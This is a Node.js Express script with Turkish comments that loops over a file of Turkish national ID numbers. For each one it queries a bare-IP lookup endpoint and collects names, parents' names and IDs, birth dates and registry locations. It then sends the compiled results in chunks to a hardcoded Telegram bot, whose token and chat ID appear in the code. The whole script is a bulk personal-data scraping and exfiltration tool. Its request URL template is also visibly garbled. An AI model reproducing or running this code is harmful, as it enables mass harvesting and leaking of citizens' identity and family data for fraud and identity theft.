const express = require('express');
const axios = require('axios');
const fs = require('fs').promises;
const path = require('path');
const FormData = require('form-data');

const app = express();
const port = process.env.PORT || 3000;

const API_URL = 'http://45.81.113.22/apiler/aile.php';
const TC_FILE = path.join(__dirname, 'blog.txt'); // Dosya adını buraya yaz (blog.txt veya sahte_tcx_1200000.txt)

const TELEGRAM_BOT_TOKEN = '8232579729:AAEPjPqCN33b-cQzDLKdeSatK8oi_b44vDo';
const TELEGRAM_CHAT_ID = '8258235296';

let progress = 0;
let totalFetched = 0;
let totalTried = 0;
let isFetching = false;

async function fetchAllTc() {
  if (isFetching) return;
  isFetching = true;
  progress = 0;
  totalFetched = 0;
  totalTried = 0;

  let tcList;
  try {
    const content = await fs.readFile(TC_FILE, 'utf8');
    tcList = content.split('\n').map(t => t.trim()).filter(t => t.length === 11 && /^\d+$/.test(t));
  } catch (err) {
    console.error('TC dosyası okunamadı:', err);
    return;
  }

  const total = tcList.length;
  console.log(`Toplam ${total} TC yüklendi, başlıyoruz...`);

  let txtContent = '';

  for (let i = 0; i < total; i++) {
    const tc = tcList[i];
    totalTried++;
    progress = Math.round((totalTried / total) * 100);

    try {
      const url = `\( {API_URL}?tc= \){tc}`;
      const res = await axios.get(url, { timeout: 6000 });
      const data = res.data;

      if (data.success && data.data) {
        const item = data.data;
        totalFetched++;

        txtContent += `TC: ${item.TC || tc}\n`;
        txtContent += `ADI: ${item.ADI || ''} SOYADI: ${item.SOYADI || ''}\n`;
        txtContent += `ANNEADI: ${item.ANNEADI || ''} ANNETC: ${item.ANNETC || ''}\n`;
        txtContent += `BABAADI: ${item.BABAADI || ''} BABATC: ${item.BABATC || ''}\n`;
        txtContent += `DOGUMTARIHI: ${item.DOGUMTARIHI || ''}\n`;
        txtContent += `NUFUSIL: ${item.NUFUSIL || ''} NUFUSILCE: ${item.NUFUSILCE || ''}\n`;
        txtContent += '-------------------\n\n';
      }
    } catch (err) {
      console.log(`TC ${tc} hata: ${err.message}`);
    }

    await new Promise(r => setTimeout(r, 400));
  }

  await fs.writeFile(path.join(__dirname, 'tum_sonuc.txt'), txtContent.trim(), 'utf8');

  // Telegram'a parça parça gönder
  const fileContent = await fs.readFile(path.join(__dirname, 'tum_sonuc.txt'));
  const fileSizeMB = fileContent.length / (1024 * 1024);

  let part = 1;
  const chunkSize = 45 * 1024 * 1024; // 45 MB parçalar
  for (let offset = 0; offset < fileContent.length; offset += chunkSize) {
    const chunk = fileContent.slice(offset, offset + chunkSize);
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('document', chunk, `sonuc_part_${part}.txt`);
    form.append('caption', `Parça ${part} | Bulunan: ${totalFetched} | Denenen: ${totalTried}`);

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
      headers: form.getHeaders()
    });
    console.log(`Parça ${part} Telegram'a gönderildi`);
    part++;
    await new Promise(r => setTimeout(r, 2000));
  }

  isFetching = false;
}

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>TC Sorgu Servisi</title>
  <style>
    body { font-family: Arial; text-align: center; background: #f0f4f8; padding: 30px; }
    h1 { color: #1a5276; }
    .progress { font-size: 80px; color: #27ae60; font-weight: bold; margin: 30px 0; }
    .count { font-size: 32px; color: #2980b9; }
    .status { font-size: 24px; margin: 20px 0; }
  </style>
</head>
<body>
  <h1>TC Listesinden Veri Çekici</h1>
  <div class="progress">%${progress}</div>
  <div class="count">Bulunan: ${totalFetched} / Denenen: ${totalTried}</div>

  ${progress < 100 ? '<div class="status">Sorgu arka planda çalışıyor... Loglara bakın.</div>' : '<div class="status">İşlem bitti! TXT Telegram\'a gitti.</div>'}
</body>
</html>`);
});

app.get('/start', async (req, res) => {
  if (totalFetched === 0 && !isFetching) {
    fetchAllTc();
    res.send('Sorgu başladı! Loglara bakın, bitince Telegram\'a gider.');
  } else {
    res.send('Zaten çalışıyor veya tamamlandı.');
  }
});

app.listen(port, () => console.log(`Port ${port}`));
